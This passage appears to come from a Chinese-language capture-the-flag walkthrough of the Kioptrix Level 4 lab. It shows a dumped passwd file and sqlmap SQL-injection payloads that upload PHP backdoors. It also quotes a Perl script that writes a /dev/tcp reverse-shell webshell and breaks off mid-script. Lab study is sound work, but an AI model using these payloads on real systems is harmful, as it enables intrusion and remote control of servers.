class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash</span><br><span class="line">john:x:1001:1001:,,,:/home/john:/bin/kshell</span><br><span class="line">robert:x:1002:1002:,,,:/home/robert:/bin/kshell</span><br></pre></td></tr></table></figure>

<ul>
<li>sqlmap的os-shell功能</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">(判断是否具有dba权限)</span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --is-dba</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                         </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                            </span></span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |                                                                            </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                            </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                          </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:12:43 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:12:43] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:12:43] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] testing if current user is DBA</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] fetching current user</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] resumed: root@localhost</span></span><br><span class="line"><span class="string">current user is DBA: True</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:12:43 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(如果有，如下所示getshell)</span></span><br><span class="line"><span class="string">root@kali:~# sqlmap -r sqlmap.txt --os-shell</span></span><br><span class="line"><span class="string">        ___</span></span><br><span class="line"><span class="string">       __H__                                                                                         </span></span><br><span class="line"><span class="string"> ___ ___[.]_____ ___ ___  &#123;1.3.11#stable&#125;                                                            </span></span><br><span class="line"><span class="string">|_ -| . [.]     | .&#x27;</span>| . |                                                                            </span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|                                                                            </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                          </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:10:50 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:10:50] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[04:10:50] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] heuristics detected web page charset &#x27;ascii&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27; OR 1343=1343#&amp;Submit=Login</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=123456&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">which web application language does the web server support?</span></span><br><span class="line"><span class="string">[1] ASP</span></span><br><span class="line"><span class="string">[2] ASPX</span></span><br><span class="line"><span class="string">[3] JSP</span></span><br><span class="line"><span class="string">[4] PHP (default)</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] retrieved the web server document root: &#x27;/var/www&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] retrieved web server absolute paths: &#x27;/var/www/checklogin.php&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] trying to upload the file stager on &#x27;/var/www/&#x27; via LIMIT &#x27;LINES TERMINATED BY&#x27; method</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] the file stager has been successfully uploaded on &#x27;/var/www/&#x27; - http://192.168.84.139:80/tmpuhuus.php</span></span><br><span class="line"><span class="string">[04:10:51] [WARNING] unable to upload the file through the web file stager to &#x27;/var/www/&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers</span></span><br><span class="line"><span class="string">[04:10:53] [INFO] the backdoor has been successfully uploaded on &#x27;/var/www/&#x27; - http://192.168.84.139:80/tmpbhqem.php</span></span><br><span class="line"><span class="string">[04:10:53] [INFO] calling OS shell. To quit type &#x27;x&#x27; or &#x27;q&#x27; and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">checklogin.php</span></span><br><span class="line"><span class="string">database.sql</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbbmjx.php</span></span><br><span class="line"><span class="string">tmpbdorc.php</span></span><br><span class="line"><span class="string">tmpbhqem.php</span></span><br><span class="line"><span class="string">tmpbstyp.php</span></span><br><span class="line"><span class="string">tmpbtzfy.php</span></span><br><span class="line"><span class="string">tmpubjrn.php</span></span><br><span class="line"><span class="string">tmpuepxr.php</span></span><br><span class="line"><span class="string">tmpuhuus.php</span></span><br><span class="line"><span class="string">tmpuijdt.php</span></span><br><span class="line"><span class="string">tmpureio.php</span></span><br><span class="line"><span class="string">tmpuyhae.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; </span></span><br></pre></td></tr></table></figure>

<p>sqlmap自带的文件上传payload</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub36.jpg"></p>
<p>如果传不了，直接用下列命令写马</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --file-write /root/shells/php/bullfuck.php --file-dest /var/www/bullshit.php        ___</span></span><br><span class="line">       __H__                                                                                                                                                    </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                                                                                                         </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                                                                                                                 </span><br><span class="line">|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                  </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                                                </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:42:12 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:42:12] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:42:12] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">[04:42:12] [WARNING] expect junk characters inside the file as a leftover from original query</span></span><br><span class="line"><span class="string">[04:42:14] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;</span>--threads<span class="string">&#x27; for faster data retrievalDBMS file system (&#x27;</span>/var/www/bullshit.php<span class="string">&#x27;)? [Y/n] </span></span><br><span class="line"><span class="string">[04:42:14] [INFO] retrieved: </span></span><br><span class="line"><span class="string">sqlmap got a 302 redirect to &#x27;</span>http://192.168.84.139:80/login_success.php?username=admin<span class="string">&#x27;. Do you want to follow? [Y/n] n</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">[04:42:17] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)</span></span><br><span class="line"><span class="string">[04:42:17] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:42:17 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(成功写入)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:                                                                                                      </span></span><br><span class="line"><span class="string">---                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">checklogin.php                                                                                                                                                                             </span></span><br><span class="line"><span class="string">database.sql                                                                                                                                                                               </span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbokko.php</span></span><br><span class="line"><span class="string">tmpuvljz.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">bullshit.php</span></span><br><span class="line"><span class="string">checklogin.php</span></span><br><span class="line"><span class="string">database.sql</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbokko.php</span></span><br><span class="line"><span class="string">tmpuvljz.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>下面再附上希腊某位大佬的傻瓜式通关脚本;)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">use LWP::UserAgent;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Coded by mr.pr0n - https://ghostinthelab.wordpress.com - (@_pr0n_)</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot; Kioptrix Level 4 - Run2Shell Script\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address of the Kioptrix box (e.g.: http://192.168.178.21)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$target</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$target</span>);</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://&quot;</span>.<span class="variable">$target</span> <span class="keyword">if</span> (<span class="variable">$target</span> !~ /^http:/);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$ip</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$ip</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the port to connect back on (e.g.: 4444)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$port</span>);</span><br><span class="line"> </span><br><span class="line">menu:;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n[+] Main Menu:\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    1. Limited Shell\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    2. Root Shell.\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    3. Exit.\n&quot;</span>    ;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$option</span>=&lt;STDIN&gt;;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>!=1 &amp;&amp; <span class="variable">$option</span>!=2 &amp;&amp; <span class="variable">$option</span>!=3)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Oups, wrong option.\nPlease, try again.\n&quot;</span>;</span><br><span class="line">goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==1)</span><br><span class="line">&#123;&amp;<span class="built_in">limit</span>&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==2)</span><br><span class="line">&#123;&amp;root&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==3)</span><br><span class="line">&#123;&amp;quit&#125;</span><br><span class="line"> </span><br><span class="line">sub <span class="built_in">limit</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$payload</span> =</span><br><span class="line">    <span class="string">&quot;&lt;?php &quot;</span>.</span><br><span class="line">    <span class="string">&quot;system(&#x27;/bin/bash -i &gt; /dev/tcp/<span class="variable">$ip</span>/<span class="variable">$port</span> 0&lt;&amp;1 2&gt;&amp;1&#x27;);&quot;</span>.</span><br><span class="line">    <span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#Encode the payload to Hex.</span></span><br><span class="line">    <span class="variable">$payload</span> =~ s/(.)/sprintf(<span class="string">&quot;%x&quot;</span>,ord(<span class="variable">$1</span>))/eg;</span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;0x&quot;</span>.<span class="string">&quot;<span class="variable">$payload</span>&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;t3hpWn.php&quot;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="string">&quot;/var/www/&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$nc</span>= <span class="string">&quot;nc -lvp <span class="variable">$port</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n[+] Wait for reverse connection on port <span class="variable">$port</span>...\n&quot;</span>;</span><br><span class="line">    system(<span class="string">&quot;xterm -e <span class="variable">$nc</span> &amp;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Uploading the backdoor to server... \n&quot;</span>;</span><br><span class="line">    <span class="variable">$junk</span>=<span class="string">&quot;&#x27;&#x27;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;&#x27; OR 1=1 UNION SELECT <span class="variable">$payload</span>,<span class="variable">$junk</span>,<span class="variable">$junk</span> INTO OUTFILE &#x27;&quot;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27; #&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$ua</span> = LWP::UserAgent-&gt;new or die;</span><br><span class="line">    <span class="variable">$req</span> = HTTP::Request-&gt;new(POST =&gt; <span class="variable">$target</span>.<span class="string">&quot;/checklogin.php&quot;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content_type(<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content(<span class="string">&quot;myusername=&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&amp;mypassword=&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&amp;Submit=Login&quot;</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$ua</span>-&gt;request(<span class="variable">$req</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sleep</span>(10);</span><br><span class="line">    <span class="variable">$int</span> = LWP::UserAgent-&gt;new() or die;</span><br><span class="line">    <span class="variable">$check</span>=<span class="variable">$int</span>-&gt;get(<span class="variable">$target</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span>-&gt;content =~ m/was not found/g)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[-] Failed to upload the backdoor!\n\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sub root</span><br><span 